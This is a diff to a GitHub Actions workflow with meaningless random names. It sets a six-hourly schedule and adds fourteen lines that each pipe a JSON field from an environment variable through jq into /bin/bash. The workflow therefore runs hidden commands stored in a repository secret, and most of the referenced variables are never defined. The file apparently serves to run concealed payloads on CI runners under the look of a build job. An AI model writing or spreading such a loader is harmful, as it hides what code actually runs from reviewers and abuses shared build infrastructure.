@@ -3,20 +3,29 @@ name: zkmmlkk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 1/6 * * *'
-
-jobs:  # 17168
+    - cron: '10 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zkmmlkk
         env:
-          rdc52823: ${{ secrets.rdc52823 }}
+          ze179: ${{ secrets.ze179 }}
         run: |
-          echo $rdc52823 | jq -r .wiyj2272 | /bin/bash
-          echo $nl51176 | jq -r .yq693 | /bin/bash
-          echo $thusc7281 | jq -r .okze07 | /bin/bash
-          echo $qjpxv05087 | jq -r .pqul59 | /bin/bash
-          echo $mu038 | jq -r .wplhj1639 | /bin/bash
+          echo $ze179 | jq -r .dhmq8 | /bin/bash
+          echo $rm998 | jq -r .n4948 | /bin/bash
+          echo $vd9556 | jq -r .uuprc9 | /bin/bash
+          echo $wuikf45752 | jq -r .kpvmi03867 | /bin/bash
+          echo $b3328 | jq -r .nry22942 | /bin/bash
+          echo $s45395 | jq -r .hb96004 | /bin/bash
+          echo $uhxn031 | jq -r .foy46178 | /bin/bash
+          echo $ao7819 | jq -r .irvuh6657 | /bin/bash
+          echo $ydl6 | jq -r .f3 | /bin/bash
+          echo $e0714 | jq -r .qruoj1 | /bin/bash
+          echo $ykesm4 | jq -r .tplus8916 | /bin/bash
+          echo $k55 | jq -r .tjl0 | /bin/bash
+          echo $ippn6403 | jq -r .cwg3 | /bin/bash
+          echo $b8 | jq -r .pukud02 | /bin/bash
 
